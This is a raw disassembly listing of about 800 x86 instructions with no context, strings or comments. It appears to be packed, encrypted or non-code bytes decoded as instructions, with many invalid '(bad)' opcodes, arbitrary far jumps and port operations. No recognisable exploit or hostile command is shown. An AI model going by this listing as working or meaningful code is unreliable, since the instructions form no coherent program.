  40fd29:	call   0xab10:0xf6e943e0
  40fd30:	inc    edx
  40fd31:	and    al,BYTE PTR [esi+0x4a]
  40fd34:	stos   BYTE PTR es:[edi],al
  40fd35:	jnp    0x40fd6e
  40fd37:	xor    DWORD PTR [eax+0x37],esp
  40fd3a:	sbb    DWORD PTR [esi],ebp
  40fd3c:	scas   al,BYTE PTR es:[edi]
  40fd3d:	mov    al,ds:0x39774b6a
  40fd42:	push   ebp
  40fd43:	int    0x45
  40fd45:	push   ds
  40fd46:	loop   0x40fd84
  40fd48:	push   0xe8b11df4
  40fd4d:	dec    ebp
  40fd4e:	jmp    0x869e:0x7568bdcd
  40fd55:	rcr    DWORD PTR [eax],cl
  40fd57:	push   edi
  40fd58:	mov    ebx,0x205d26b
  40fd5d:	push   ds
  40fd5e:	jl     0x40fd64
  40fd60:	test   BYTE PTR [eax],al
  40fd62:	add    BYTE PTR [esi+0x74],bl
  40fd65:	cmc    
  40fd66:	xchg   ecx,eax
  40fd67:	sahf   
  40fd68:	push   cs
  40fd69:	test   ebx,esi
  40fd6b:	jle    0x40fde0
  40fd6d:	out    dx,eax
  40fd6e:	retf   
  40fd6f:	inc    eax
  40fd70:	push   edx
  40fd71:	add    BYTE PTR [eax],al
  40fd73:	jp     0x40fd52
  40fd75:	lods   al,BYTE PTR ds:[esi]
  40fd76:	cdq    
  40fd77:	dec    ecx
  40fd78:	hlt    
  40fd79:	pop    ds
  40fd7a:	jmp    0x40fcfe
  40fd7c:	add    al,0x77
  40fd7e:	add    BYTE PTR [eax],al
  40fd80:	fwait
  40fd81:	and    dh,cl
  40fd83:	stos   BYTE PTR es:[edi],al
  40fd84:	in     eax,0xdc
  40fd86:	jmp    0xa900:0xf58090
  40fd8d:	scas   eax,DWORD PTR es:[edi]
  40fd8e:	out    0x69,al
  40fd90:	mov    ecx,0x5b63b422
  40fd95:	fadd   st(2),st
  40fd97:	std    
  40fd98:	lds    ebx,FWORD PTR [edi+eiz*4+0x1d]
  40fd9c:	test   BYTE PTR [edx],cl
  40fd9e:	add    BYTE PTR [eax],al
  40fda0:	sbb    ebx,DWORD PTR [ecx+esi*1]
  40fda3:	cmp    al,0xb1
  40fda5:	fld    st(4)
  40fda7:	out    0x0,al
  40fda9:	add    BYTE PTR [edi-0x54],dh
  40fdac:	dec    ecx
  40fdad:	mov    ecx,DWORD PTR ds:0x698812f9
  40fdb3:	add    BYTE PTR [eax],al
  40fdb5:	xlat   BYTE PTR ds:[ebx]
  40fdb6:	mov    eax,ds:0xcb042a7b
  40fdbb:	add    BYTE PTR [eax],al
  40fdbd:	(bad)  
  40fdbe:	retf   
  40fdbf:	lahf   
  40fdc0:	ss repz mov al,0x72
  40fdc4:	xor    cl,BYTE PTR [eax+ecx*4]
  40fdc7:	add    BYTE PTR [eax],al
  40fdc9:	xchg   BYTE PTR [esi],bh
  40fdcb:	cmp    DWORD PTR [ebx],ecx
  40fdcd:	fdiv   QWORD PTR [eax-0x5865922]
  40fdd3:	fsub   DWORD PTR [edx+0x16cbddad]
  40fdd9:	pop    esp
  40fdda:	(bad)  
  40fddb:	pop    ecx
  40fddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fddd:	cmc    
  40fdde:	lock test BYTE PTR [ecx],dh
  40fde1:	add    BYTE PTR [eax],al
  40fde3:	and    eax,DWORD PTR [ecx+0xd]
  40fde6:	(bad)  
  40fde7:	scas   eax,DWORD PTR es:[edi]
  40fde8:	aaa    
  40fde9:	ins    DWORD PTR es:[edi],dx
  40fdea:	into   
  40fdeb:	scas   eax,DWORD PTR es:[edi]
  40fdec:	pushf  
  40fded:	and    DWORD PTR [ebx-0x4af31ed4],edi
  40fdf3:	add    BYTE PTR [eax],al
  40fdf5:	ss push ebp
  40fdf7:	pop    ebx
  40fdf8:	push   esp
  40fdf9:	sbb    WORD PTR [ecx-0x5c],0x7982
  40fdff:	ss jmp 0x22b3:0xf00e1749
  40fe07:	out    0x5f,eax
  40fe09:	or     bl,BYTE PTR [edi]
  40fe0b:	push   ebp
  40fe0d:	ins    DWORD PTR es:[edi],dx
  40fe0e:	leave  
  40fe0f:	inc    eax
  40fe10:	stos   DWORD PTR es:[edi],eax
  40fe11:	add    BYTE PTR [eax],al
  40fe13:	xchg   ebx,eax
  40fe14:	dec    ebp
  40fe15:	in     eax,dx
  40fe16:	imul   eax
  40fe18:	mov    esi,esp
  40fe1a:	add    eax,0xfd08
  40fe1f:	rol    BYTE PTR [edi],1
  40fe21:	iret   
  40fe22:	int    0x2d
  40fe24:	jbe    0x40fdd6
  40fe26:	jne    0x40fe9f
  40fe28:	jge    0x40fe1a
  40fe2a:	aad    0x66
  40fe2c:	out    dx,al
  40fe2d:	mov    eax,ds:0x74007112
  40fe32:	add    BYTE PTR [eax],al
  40fe34:	repnz xlat BYTE PTR ds:[ebx]
  40fe36:	jmp    0x40fe40
  40fe38:	and    al,BYTE PTR [eax]
  40fe3a:	add    BYTE PTR ds:0x3940f6,ch
  40fe40:	add    BYTE PTR [eax+0x1204ca],dh
  40fe46:	add    BYTE PTR [edx+0x68d4cd4d],dl
  40fe4c:	mov    ds:0xd46d8774,eax
  40fe51:	aaa    
  40fe52:	(bad)  
  40fe53:	popf   
  40fe54:	inc    ebx
  40fe55:	inc    esp
  40fe56:	fiadd  DWORD PTR [eax]
  40fe58:	add    BYTE PTR ds:0x2048,dl
  40fe5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe5f:	repnz add BYTE PTR [eax+eax*1],bh
  40fe63:	add    dh,dl
  40fe65:	cmp    dh,BYTE PTR [ebx]
  40fe67:	push   ebx
  40fe68:	(bad)  
  40fe6a:	sysret 
  40fe6c:	in     eax,dx
  40fe6d:	out    0xb4,eax
  40fe6f:	cmp    al,0x63
  40fe71:	mov    esp,0xcf1f154
  40fe76:	imul   eax,DWORD PTR [eax],0x804000
  40fe7c:	add    BYTE PTR [eax+edi*8+0x7754906a],ch
  40fe83:	rol    DWORD PTR [ebx+esi*1+0x0],cl
  40fe87:	add    BYTE PTR [edi],dh
  40fe89:	std    
  40fe8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe8b:	xchg   esp,eax
  40fe8c:	js     0x40fe75
  40fe8e:	bound  ebp,QWORD PTR [eax+0x55]
  40fe91:	loopne 0x40fe7a
  40fe93:	stos   DWORD PTR es:[edi],eax
  40fe94:	arpl   WORD PTR [ecx],bp
  40fe96:	fmulp  st(3),st
  40fe98:	or     al,bl
  40fe9a:	dec    esi
  40fe9b:	adc    eax,0x66605a26
  40fea0:	cmc    
  40fea1:	sbb    ecx,DWORD PTR [ecx-0x6731d4af]
  40fea7:	xchg   edi,eax
  40fea8:	adc    DWORD PTR [ebx+0x4f],ebx
  40feab:	pop    esp
  40feac:	das    
  40fead:	mov    bh,0xf8
  40feaf:	cmp    DWORD PTR [edx+0x49fa98b2],0x4108
  40feb9:	stos   BYTE PTR es:[edi],al
  40feba:	out    0xc5,eax
  40febc:	jbe    0x40fef2
  40febe:	mov    dl,0x83
  40fec0:	inc    eax
  40fec1:	and    eax,0xc9220000
  40fec6:	push   edx
  40fec7:	mov    eax,ds:0xa7c082
  40fecc:	add    BYTE PTR [eax],cl
  40fece:	mov    ds:0xc1830000,al
  40fed3:	lods   al,BYTE PTR ds:[esi]
  40fed4:	daa    
  40fed5:	fdiv   st(4),st
  40fed7:	clc    
  40fed8:	xor    al,0xe1
  40feda:	rcl    DWORD PTR [edi+0x7044d7],1
  40fee0:	add    BYTE PTR [edi],dh
  40fee2:	inc    ebp
  40fee3:	mov    eax,0x62320247
  40fee8:	xlat   BYTE PTR ds:[ebx]
  40fee9:	ja     0x40feaf
  40feeb:	mov    ecx,0xc6e80000
  40fef0:	push   es
  40fef1:	nop
  40fef2:	xchg   edi,eax
  40fef3:	loopne 0x40feb3
  40fef5:	(bad)
  40fef8:	aaa    
  40fef9:	inc    edx
  40fefa:	sbb    DWORD PTR [edi+esi*1+0x0],eax
  40fefe:	add    BYTE PTR [ebx-0x55],ch
  40ff01:	push   ebx
  40ff02:	mov    al,BYTE PTR [edi+0x6d]
  40ff05:	jl     0x40ff4e
  40ff07:	mov    cl,0xbe
  40ff09:	add    DWORD PTR [ebx-0x3b457db7],eax
  40ff0f:	pusha  
  40ff10:	add    BYTE PTR [eax],al
  40ff12:	popa   
  40ff13:	rcl    DWORD PTR [edx],0xc5
  40ff16:	ror    bl,1
  40ff18:	sti    
  40ff19:	xchg   BYTE PTR [ecx+0x77517db3],bl
  40ff1f:	pop    eax
  40ff20:	cmp    esp,DWORD PTR [edi-0x79]
  40ff23:	add    eax,0xf19f69ce
  40ff28:	inc    edi
  40ff29:	mov    dh,0x6d
  40ff2b:	xchg   edx,eax
  40ff2c:	pop    eax
  40ff2d:	cmp    ch,bh
  40ff2f:	jo     0x40ffa9
  40ff31:	fwait
  40ff32:	mov    DWORD PTR [ebx+0xad04],ebx
  40ff38:	clc    
  40ff39:	jo     0x40ff63
  40ff3b:	add    cl,BYTE PTR [ebx+0x28]
  40ff3e:	inc    ebx
  40ff3f:	mov    esi,0xb2dece1b
  40ff44:	repz and DWORD PTR [ebx+0x60],edx
  40ff48:	aas    
  40ff49:	sub    BYTE PTR [edi+edi*1],bl
  40ff4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff4d:	jns    0x40ff4c
  40ff4f:	test   al,0x1
  40ff51:	test   ch,dh
  40ff53:	add    BYTE PTR [eax],al
  40ff55:	jmp    0x9e1db19c
  40ff5a:	in     eax,dx
  40ff5b:	mov    BYTE PTR [edi+0x0],dh
  40ff5e:	add    BYTE PTR [eax+0x3a0838cd],bh
  40ff64:	add    BYTE PTR [eax],al
  40ff66:	neg    DWORD PTR [ebp+0x53]
  40ff69:	mov    cl,0xe5
  40ff6b:	push   0xffffffe7
  40ff6d:	inc    edi
  40ff6e:	dec    esp
  40ff6f:	repnz add BYTE PTR [eax],al
  40ff72:	fsub   DWORD PTR [edx-0x4f]
  40ff75:	cwde   
  40ff76:	sahf   
  40ff77:	push   esi
  40ff78:	pop    ds
  40ff79:	mov    ecx,0xeb46f34d
  40ff7e:	int3   
  40ff7f:	dec    ebp
  40ff80:	add    BYTE PTR [eax],al
  40ff82:	(bad)  
  40ff83:	ror    BYTE PTR [eax],cl
  40ff85:	or     eax,DWORD PTR [eax]
  40ff87:	add    BYTE PTR [edi-0x3a5ff837],cl
  40ff8d:	scas   al,BYTE PTR es:[edi]
  40ff8e:	mov    ebx,0x42c83374
  40ff93:	add    BYTE PTR [eax],al
  40ff95:	icebp  
  40ff96:	pusha  
  40ff97:	aad    0x5d
  40ff99:	pop    ds
  40ff9a:	stos   DWORD PTR es:[edi],eax
  40ff9b:	dec    eax
  40ff9c:	jmp    0x40ff9e
  40ff9e:	add    BYTE PTR [ebp+0xe],bl
  40ffa1:	sahf   
  40ffa2:	aaa    
  40ffa3:	or     dl,dh
  40ffa5:	std    
  40ffa6:	les    ebp,FWORD PTR [ebx+0x0]
  40ffa9:	add    BYTE PTR [ebx+0x62a60576],cl
  40ffaf:	cwde   
  40ffb0:	push   ebp
  40ffb1:	pop    ebx
  40ffb2:	xchg   edi,eax
  40ffb3:	mov    ds:0x50174146,eax
  40ffb8:	inc    ebp
  40ffb9:	in     eax,0xf3
  40ffbb:	mov    BYTE PTR [esi],ch
  40ffbd:	add    BYTE PTR [eax],al
  40ffbf:	jno    0x40ffad
  40ffc1:	push   ebx
  40ffc2:	add    BYTE PTR [ebx+0x0],bh
  40ffc5:	add    BYTE PTR [ecx+0xd28c],dl
  40ffcb:	sbb    BYTE PTR [esi+ecx*1],0x28
  40ffcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd0:	scas   al,BYTE PTR es:[edi]
  40ffd1:	mov    edx,0x869e09b7
  40ffd6:	maskmovq mm5,mm4
  40ffd9:	sbb    al,BYTE PTR [eax]
  40ffdb:	clc    
  40ffdc:	add    BYTE PTR [eax],al
  40ffde:	pop    edx
  40ffdf:	push   eax
  40ffe0:	sbb    dh,BYTE PTR [edx-0x63961439]
  40ffe6:	jb     0x118c2eda
  40ffec:	sbb    al,0x87
  40ffee:	les    esi,FWORD PTR [eax]
  40fff0:	add    BYTE PTR [eax],al
  40fff2:	dec    ebx
  40fff3:	mov    edx,0xc50c
  40fff8:	xchg   esp,eax
  40fff9:	pop    ds
  40fffa:	sahf   
  40fffb:	sbb    al,0xd2
  40fffd:	lock jge 0x40ffeb
  410000:	push   esi
  410001:	jns    0x40ffa7
  410003:	mov    edi,0x8dc422
  410008:	add    BYTE PTR [edi],bh
  41000a:	push   0x2c
  41000c:	jo     0x41001d
  41000e:	mov    ebp,0xa6841d
  410013:	add    BYTE PTR [ebx+0x318c3dfb],ah
  410019:	add    BYTE PTR [eax],al
  41001b:	in     eax,dx
  41001c:	xlat   BYTE PTR ds:[ebx]
  41001d:	sbb    BYTE PTR [eax*4-0x743615d5],dh
  410024:	adc    ecx,0xffffffef
  410027:	mov    edi,0x503bd065
  41002c:	(bad)  [edi-0x50]
  41002f:	push   edx
  410030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410031:	in     al,dx
  410032:	push   es
  410033:	mov    edi,DWORD PTR [eax]
  410035:	push   edx
  410036:	xchg   esi,eax
  410037:	push   cs
  410038:	cmp    edx,DWORD PTR [ebx+eax*8]
  41003b:	(bad)  [edx-0x61]
  41003e:	push   ss
  41003f:	int    0x60
  410041:	jecxz  0x410081
  410043:	xor    BYTE PTR [esi-0x71e49c5],ah
  410049:	sub    DWORD PTR [edi+0x35],edi
  41004c:	sbb    eax,0xa8434
  410051:	add    BYTE PTR [ebp+0x4eddd473],bh
  410057:	mov    edx,0x25782e73
  41005c:	idiv   DWORD PTR [esi+esi*2]
  41005f:	out    0x7c,al
  410061:	xchg   edx,eax
  410062:	sahf   
  410063:	cwde   
  410064:	nop
  410065:	inc    esp
  410066:	add    eax,0x27660000
  41006b:	sbb    dh,BYTE PTR [esi+0x74]
  41006e:	mov    BYTE PTR [ecx+0x29e80000],al
  410074:	in     al,dx
  410075:	outs   dx,BYTE PTR ds:[esi]
  410076:	push   ds
  410077:	or     eax,DWORD PTR [eax]
  410079:	push   ds
  41007a:	add    BYTE PTR [eax],al
  41007c:	dec    edx
  41007d:	stos   BYTE PTR es:[edi],al
  41007e:	cmc    
  41007f:	and    DWORD PTR [ecx+ebp*4],eax
  410082:	add    BYTE PTR [eax],al
  410084:	ror    al,0x0
  410087:	add    BYTE PTR [edi],cl
  410089:	mov    BYTE PTR [esi+0x0],dh
  41008c:	add    BYTE PTR [edi-0x90f6a43],al
  410092:	and    eax,0x7adce38d
  410097:	mov    esp,gs
  410099:	add    BYTE PTR [eax],al
  41009b:	fist   DWORD PTR [edx+0x228cd1]
  4100a1:	add    dh,cl
  4100a3:	jmp    0x123ccbd
  4100a8:	add    ah,bh
  4100aa:	dec    ecx
  4100ab:	sar    BYTE PTR [edi-0x783ef699],cl
  4100b1:	daa    
  4100b2:	mov    bh,0x92
  4100b4:	int3   
  4100b5:	and    al,0x0
  4100b7:	add    BYTE PTR [ebx],ch
  4100b9:	out    0x88,eax
  4100bb:	adc    eax,DWORD PTR [eax]
  4100bd:	add    BYTE PTR [edx+0x2c8db],bh
  4100c3:	add    BYTE PTR [ebx],dh
  4100c5:	sub    DWORD PTR [ebx],0xffffffab
  4100c8:	ret    
  4100c9:	ins    DWORD PTR es:[edi],dx
  4100ca:	cmp    DWORD PTR ds:0xf80c35,eax
  4100d0:	add    BYTE PTR [edx-0x55],bh
  4100d3:	push   es
  4100d4:	shr    BYTE PTR [ebp-0x4c],1
  4100d7:	dec    esi
  4100d8:	or     cl,ah
  4100da:	add    BYTE PTR [eax],al
  4100dc:	push   ebx
  4100dd:	add    BYTE PTR [esi+0x0],cl
  4100e0:	add    ah,dh
  4100e2:	add    eax,esp
  4100e4:	adc    DWORD PTR [eax],eax
  4100e6:	add    BYTE PTR [edi],dh
  4100e8:	dec    ecx
  4100e9:	jbe    0x410138
  4100eb:	das    
  4100ec:	cmp    BYTE PTR [edx+0xec5b68e],dh
  4100f2:	and    eax,0xa50c
  4100f7:	pop    edx
  4100f8:	pop    ds
  4100f9:	sub    ecx,DWORD PTR [edi+ecx*1+0x0]
  4100fd:	add    BYTE PTR [ebp+0x9048],ah
  410103:	loope  0x410109
  410105:	mov    edx,0xae250000
  41010a:	xchg   ecx,eax
  41010b:	fst    QWORD PTR [eax+0x2b]
  41010e:	in     eax,dx
  41010f:	sub    DWORD PTR [ebx+edx*8+0x1804d319],ebp
  410116:	add    BYTE PTR [eax],al
  410118:	xchg   DWORD PTR [edi-0x41],ecx
  41011b:	ds and ecx,edx
  41011e:	push   edx
  41011f:	jp     0x410154
  410121:	mov    eax,0x67f65fa1
  410126:	push   0x5089fd7f
  41012b:	test   BYTE PTR [ecx-0x69940000],ah
  410131:	push   esp
  410132:	mul    BYTE PTR [ebx-0x58]
  410135:	arpl   WORD PTR [ecx],ax
  410137:	mov    ss,ecx
  410139:	mov    WORD PTR [ecx+0x0],cs
  41013c:	add    bh,dh
  41013e:	jae    0x41017a
  410140:	out    dx,eax
  410141:	(bad)  
  410143:	ins    DWORD PTR es:[edi],dx
  410144:	xlat   BYTE PTR ds:[ebx]
  410145:	in     al,dx
  410146:	fnstsw ax
  410148:	xchg   ebp,eax
  410149:	mov    esp,0x70b20975
  41014e:	dec    edi
  41014f:	mov    dh,0x4f
  410151:	push   ebx
  410152:	fs push ds
  410154:	stos   BYTE PTR es:[edi],al
  410155:	xor    DWORD PTR [eax+0x532f660a],edx
  41015b:	jae    0x41018e
  41015d:	sub    BYTE PTR [ebp-0x49b1b6f9],ch
  410163:	les    edi,FWORD PTR [edx-0x25460000]
  410169:	add    al,0xee
  41016b:	add    BYTE PTR [eax],al
  41016d:	jae    0x4101c7
  41016f:	popa   
  410170:	and    al,0x76
  410172:	xor    BYTE PTR [edx+ecx*2],0xb9
  410176:	(bad)  
  410178:	cmp    DWORD PTR [eax],esi
  41017a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41017b:	sahf   
  41017c:	sub    dl,BYTE PTR [ecx]
  41017e:	mov    ecx,0x46d1a1f7
  410183:	dec    esi
  410184:	or     al,0xe8
  410186:	add    BYTE PTR [eax],al
  410188:	aad    0xbf
  41018a:	aam    0x9f
  41018c:	sub    al,0x35
  41018e:	pop    esi
  41018f:	imul   ax,WORD PTR [esi-0x308eeee4],0xffd6
  410197:	or     eax,0x7ee08d59
  41019c:	cmp    esp,DWORD PTR [esi-0x4ea354db]
  4101a2:	cwde   
  4101a3:	cmp    al,0x5a
  4101a5:	in     eax,0x59
  4101a7:	repnz outs dx,BYTE PTR ds:[esi]
  4101a9:	mov    edx,0x20919cc2
  4101ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101af:	inc    edi
  4101b0:	out    0x41,eax
  4101b2:	mov    dl,bl
  4101b4:	add    BYTE PTR [eax],al
  4101b6:	jno    0x410207
  4101b8:	inc    eax
  4101b9:	or     al,0x0
  4101bb:	add    BYTE PTR [ebx+0x29],dl
  4101be:	pmaddwd mm6,QWORD PTR es:[ebp-0x38]
  4101c3:	dec    esp
  4101c4:	add    BYTE PTR [eax],al
  4101c6:	push   es
  4101c7:	cwde   
  4101c8:	lds    esp,FWORD PTR [esi-0x3c]
  4101cb:	mov    ds:0x287e0000,al
  4101d0:	sub    eax,0x550468
  4101d5:	add    BYTE PTR [edx+0x1380425a],cl
  4101db:	add    BYTE PTR [eax],al
  4101dd:	cmp    al,0xe5
  4101df:	imul   ebp,DWORD PTR gs:0x3cfa8a9,0x4184ad
  4101ea:	add    al,dh
  4101ec:	mov    ah,0x78
  4101ee:	mov    gs,esi
  4101f0:	outs   dx,DWORD PTR ds:[esi]
  4101f1:	mov    dh,0x72
  4101f3:	mov    eax,ds:0x4777b4b
  4101f8:	inc    esp
  4101f9:	add    BYTE PTR [eax],al
  4101fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101fc:	(bad)  
  4101fd:	jno    0x4101e9
  4101ff:	retf   
  410200:	pop    esi
  410201:	mov    esp,0xd6a6d6ed
  410206:	push   es
  410207:	retf   
  410208:	mov    ch,0x30
  41020a:	ds cmp eax,0xda37d0b4
  410210:	cs mov edi,0xb15cc73a
  410216:	jb     0x4101e3
  410218:	iret   
  410219:	mov    cs,WORD PTR [edi+0x77ec275f]
  41021f:	shl    DWORD PTR [esp+edi*1+0x27],0x6a
  410224:	addr16 lahf 
  410226:	les    edi,FWORD PTR [eax+0x0]
  410229:	add    bh,al
  41022b:	pop    edx
  41022c:	(bad)  
  41022d:	dec    esp
  41022e:	or     DWORD PTR [eax],eax
  410230:	add    BYTE PTR [ebx-0x65f2131f],ch
  410236:	xchg   ebx,eax
  410237:	idiv   DWORD PTR [edi+0x41]
  41023a:	in     eax,dx
  41023b:	cld    
  41023c:	dec    ebp
  41023d:	fsubr  st(7),st
  41023f:	ss dec esp
  410241:	pop    edx
  410242:	add    BYTE PTR [eax],al
  410244:	scas   al,BYTE PTR es:[edi]
  410245:	les    eax,FWORD PTR [esi+0x1cb90000]
  41024b:	imul   ecx,DWORD PTR [eax-0x68ffff14],0x329ca151
  410255:	mov    ds:0x4db66885,eax
  41025a:	mov    edi,0xbc9a671
  41025f:	mov    ebp,0x842ac3f6
  410264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410265:	add    BYTE PTR [eax],al
  410267:	pop    ebp
  410268:	and    eax,0x5456ae28
  41026d:	in     eax,0xbe
  41026f:	add    al,0x85
  410271:	add    BYTE PTR [eax],al
  410273:	jmp    0x410202
  410275:	repz and BYTE PTR [esi],0xc3
  410279:	fbld   TBYTE PTR [edi+0x54]
  41027c:	stc    
  41027d:	in     al,0xa9
  41027f:	mov    BYTE PTR [edi],ch
  410281:	add    BYTE PTR [eax],al
  410283:	dec    esi
  410284:	lock out 0x2,al
  410287:	mov    ebp,0xfc6a1eba
  41028c:	and    DWORD PTR [edi],ecx
  41028e:	cmp    eax,0x8292f4f4
  410294:	xor    edi,0x9161c3ee
  41029a:	jp     0x4102bc
  41029c:	inc    ebp
  41029d:	jl     0x4102d1
  41029f:	lahf   
  4102a0:	ins    BYTE PTR es:[edi],dx
  4102a1:	rcl    BYTE PTR ds:0x947c73e1,1
  4102a7:	adc    ebp,DWORD PTR [ecx]
  4102a9:	mov    esp,0xfbffb14e
  4102ae:	les    edi,FWORD PTR [ecx-0x6ea0000]
  4102b4:	mov    edx,0xe01dae73
  4102b9:	imul   BYTE PTR [esi+0x53]
  4102bc:	or     al,0x15
  4102be:	add    BYTE PTR [eax],al
  4102c0:	test   al,0xc9
  4102c2:	adc    edx,DWORD PTR [ebx+edi*4+0x14]
  4102c6:	outs   dx,BYTE PTR ds:[esi]
  4102c7:	xchg   ebp,eax
  4102c8:	into   
  4102c9:	aas    
  4102ca:	mov    edx,DWORD PTR [ecx+0x34]
  4102cd:	out    0xa2,al
  4102cf:	mov    ch,0x7
  4102d1:	outs   dx,BYTE PTR ds:[esi]
  4102d2:	test   BYTE PTR [edx],ch
  4102d4:	add    BYTE PTR [eax],al
  4102d6:	(bad)  
  4102d7:	mul    DWORD PTR [edx]
  4102d9:	test   eax,0x3c1ef9ed
  4102de:	addr16 inc esi
  4102e0:	dec    esp
  4102e1:	and    al,BYTE PTR [eax]
  4102e3:	add    dh,al
  4102e5:	mov    esi,0x3cfe27f8
  4102ea:	mov    dl,0xeb
  4102ec:	in     eax,0xea
  4102ee:	call   FWORD PTR [ecx+edi*8+0x55]
  4102f2:	out    dx,al
  4102f3:	inc    ebx
  4102f4:	mov    edx,0xea6ee66
  4102f9:	jne    0x41032f
  4102fb:	add    DWORD PTR [edx],edi
  4102fd:	lock outs dx,DWORD PTR ds:[esi]
  4102ff:	push   0x9f7e1764
  410304:	adc    DWORD PTR [eax-0x15ce393],esi
  41030a:	retf   
  41030b:	sbb    edi,DWORD PTR [eax-0x53]
  41030e:	push   ebp
  41030f:	mov    ebp,0x546b2d39
  410314:	ret    
  410315:	hlt    
  410316:	imul   esp,DWORD PTR [edi-0x551b30e6],0xffffffc5
  41031d:	xchg   ebx,eax
  41031e:	icebp  
  41031f:	fdivr  QWORD PTR [edx-0x40]
  410322:	or     eax,0x3c6b0000
  410327:	pop    ecx
  410328:	call   0xcea:0xf4816456
  41032f:	adc    eax,DWORD PTR [eax]
  410331:	add    ch,dh
  410333:	cmp    esi,DWORD PTR [ebx]
  410335:	sub    bl,cl
  410337:	test   DWORD PTR [ecx+0x44],eax
  41033a:	xchg   DWORD PTR [eax],eax
  41033c:	add    BYTE PTR [eax-0x58],dh
  41033f:	leave  
  410340:	pop    ebp
  410341:	and    al,0xdf
  410343:	add    bh,bh
  410345:	sub    BYTE PTR [ecx-0x14120000],0x21
  41034c:	jle    0x41034e
  41034e:	add    BYTE PTR cs:[eax],al
  410351:	neg    dh
  410353:	and    ebp,esp
  410355:	inc    esp
  410356:	push   0x34580000
  41035b:	mov    WORD PTR [ebx+0x0],cs
  41035e:	add    bh,ch
  410360:	je     0x410392
  410362:	inc    esp
  410363:	add    BYTE PTR [eax],al
  410365:	add    BYTE PTR ds:0xeda88ff8,bl
  41036b:	retf   0x5cd0
  41036e:	loopne 0x4103b1
  410370:	push   ss
  410371:	mov    esp,0x26571516
  410376:	mov    eax,ds:0xbbc82f
  41037b:	add    BYTE PTR [ebp+0x24],bl
  41037e:	mov    BYTE PTR [ebx+0x7dd10000],cl
  410384:	call   0x6462:0x760c
  41038b:	pop    esi
  41038c:	dec    edx
  41038d:	icebp  
  41038e:	inc    DWORD PTR [ebx-0x6b58e83]
  410394:	out    dx,eax
  410395:	add    BYTE PTR [eax+eax*1],ah
  410398:	add    BYTE PTR [ecx],cl
  41039a:	add    eax,edi
  41039c:	cmp    al,0x0
  41039e:	sub    al,BYTE PTR [eax]
  4103a0:	add    BYTE PTR [ebx-0x40ddc95b],cl
  4103a6:	ss int3 
  4103a8:	pop    DWORD PTR [eax]
  4103aa:	add    BYTE PTR [ebx+0x22],bl
  4103ad:	pop    ebp
  4103ae:	or     DWORD PTR [ebx-0x58c4d3bf],esi
  4103b4:	jl     0x4103ff
  4103b6:	add    eax,0x7048cf
  4103bb:	add    al,al
  4103bd:	fld    QWORD PTR [eax]
  4103bf:	add    BYTE PTR [edi*2+0x54080000],cl
  4103c6:	add    BYTE PTR [eax],al
  4103c8:	pop    edx
  4103c9:	test   eax,0x24e06fe6
  4103ce:	scas   eax,DWORD PTR es:[edi]
  4103cf:	push   ds
  4103d0:	or     ebp,DWORD PTR [edi+0x54cd390f]
  4103d6:	inc    edi
  4103d7:	cs icebp 
  4103d9:	fstp   TBYTE PTR [edx-0x33]
  4103dc:	xchg   DWORD PTR [edi+0x13be7bed],ebx
  4103e2:	repnz fsub st,st(6)
  4103e5:	je     0x4103a0
  4103e7:	jmp    0x87214af2
  4103ec:	dec    ecx
  4103ed:	and    DWORD PTR [ecx-0x18fca1f],edx
  4103f3:	sti    
  4103f4:	pop    ds
  4103f5:	inc    ecx
  4103f6:	dec    ebx
  4103f7:	in     eax,0x56
  4103f9:	jne    0x410477
  4103fb:	xchg   esi,eax
  4103fc:	and    eax,0x81327cff
  410401:	(bad)  
  410403:	inc    ebx
  410404:	sbb    bl,BYTE PTR [esi+0x678891]
  41040a:	add    dh,dl
  41040c:	fnstsw WORD PTR [edx-0x216a0131]
  410412:	scas   eax,DWORD PTR es:[edi]
  410413:	jg     0x4103bc
  410415:	push   ecx
  410416:	(bad)  
  410418:	enter  0x9,0x0
  41041c:	stc    
  41041d:	mov    ah,0x87
  41041f:	inc    edx
  410420:	or     DWORD PTR [edi-0x2],edi
  410423:	scas   al,BYTE PTR es:[edi]
  410424:	popa   
  410425:	sbb    DWORD PTR [edi+0x474451],ecx
  41042b:	add    cl,cl
  41042d:	imul   ebp,DWORD PTR [edi],0xe
  410430:	ret    
  410431:	div    esi
  410433:	retf   0x20d
  410436:	jo     0x4103c1
  410438:	xchg   ebp,eax
  410439:	leave  
  41043a:	add    eax,0x426c3845
  41043f:	test   bh,0x19
  410442:	div    DWORD PTR [ebx+0xa]
  410445:	mov    bh,0x7a
  410447:	xchg   cl,dl
  410449:	cmc    
  41044a:	or     eax,0x5a6787d
  41044f:	xor    DWORD PTR [ebx+0x1],0xebc09b2e
  410456:	add    BYTE PTR [eax],al
  410458:	xchg   esi,eax
  410459:	mov    bl,0x94
  41045b:	nop
  41045c:	push   ebp
  41045d:	lods   eax,DWORD PTR ds:[esi]
  41045e:	mov    esp,0xd3b3cb8
  410463:	aaa    
  410464:	icebp  
  410465:	and    edi,eax
  410467:	popa   
  410468:	test   DWORD PTR ds:0x6359c53d,esp
  41046e:	pop    edi
  41046f:	xchg   BYTE PTR ds:[esi-0x2e0af677],al
  410476:	sub    DWORD PTR [esp+ebp*4],ebx
  410479:	in     eax,dx
  41047a:	(bad)  
  41047b:	mov    ch,0xd
  41047d:	hlt    
  41047e:	pop    ecx
  41047f:	sub    al,0x1
  410481:	loope  0x41041c
  410483:	call   0x20d112e3
  410488:	imul   ebp,DWORD PTR [ecx+0x45],0x25
  41048c:	sbb    edi,DWORD PTR [esi]
  41048e:	and    esi,DWORD PTR [edx+0xecc05d]
  410494:	add    BYTE PTR [edx+0x78e7bb87],dh
  41049a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41049b:	push   0x2b80
  4104a0:	dec    ebx
  4104a1:	mov    edx,0xc3a3b175
  4104a6:	ret    
  4104a7:	xchg   ecx,edi
  4104a9:	push   ebp
  4104aa:	loop   0x41046f
  4104ac:	sbb    dh,0x0
